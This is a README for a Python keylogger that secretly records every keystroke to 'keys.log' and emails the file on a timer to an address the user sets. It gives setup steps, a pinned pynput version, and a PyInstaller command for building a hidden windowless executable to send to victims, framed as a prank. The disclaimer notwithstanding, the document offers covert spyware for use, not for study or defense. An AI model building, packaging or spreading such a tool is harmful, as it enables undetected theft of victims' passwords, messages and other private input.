# Keylogger Software!

## Information
On execution, it secretly runs and stores everything the user types in a file, called "keys.log".\
Then, it sends an email every specified delay to a specific email address with this file attached.\
The user can't detect any of this as it runs secretly in background; the victim has to manually kill the process with task manager or reboot the computer to stop it.

**Please, do not use this to harm other people. _I do not take responsibility for any damage caused with this file._**

## Instructions
Install all the dependencies and manually change lines 14, 15 and 16, with the sender's email (gmail, or change the smtp_server variable), receiver's email and sender's email's password respectively.\
You can also change the delay between each e-mail by modifying line 41 and replacing the function's argument to your desired time in seconds (10 minutes default).\
*If you use gmail, you might need to enable the "Allow less secure apps" option in your google account, in order to allow this script to log-in your account.*

## Dependencies
- Pynput *(important: install version 1.6.8, as the newest version has troubles running with PyInstaller. You can install it with ```pip install pynput==1.6.8```)*
- PyInstaller *(to convert it to an executable file. ```pip install pyinstaller```)*

## How to convert it to an EXE file
Once you have modified and saved the main file with your data, run the command prompt in the same folder as the main.py file and simply type the following command: ```pyinstaller --onefile -w main.py```\
Go to the new created directory "dist" and you'll see your desired .exe file with every dependency in it, so it can be executed on any computer!\
Sent it to prank your friends!
